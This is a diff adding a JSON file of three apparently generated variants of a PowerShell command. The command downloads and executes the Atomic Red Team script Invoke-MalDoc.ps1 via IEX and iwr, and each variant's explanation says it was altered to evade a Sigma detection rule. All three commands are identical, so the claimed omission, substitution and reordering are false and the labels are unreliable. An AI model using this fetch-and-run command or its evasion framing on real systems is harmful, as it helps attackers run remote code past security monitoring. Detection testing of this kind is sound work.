@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Omission: Removed the obfuscated code that contains multiple special characters and backticks, which may trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Substitution: Replaced the complex obfuscated code with a simplified command that does not include the suspicious special characters or backticks."
+  },
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Reordering: Reordered the command-line arguments to ensure that the suspicious obfuscated code is not present, thus avoiding the Sigma rule's detection."
+  }
+]
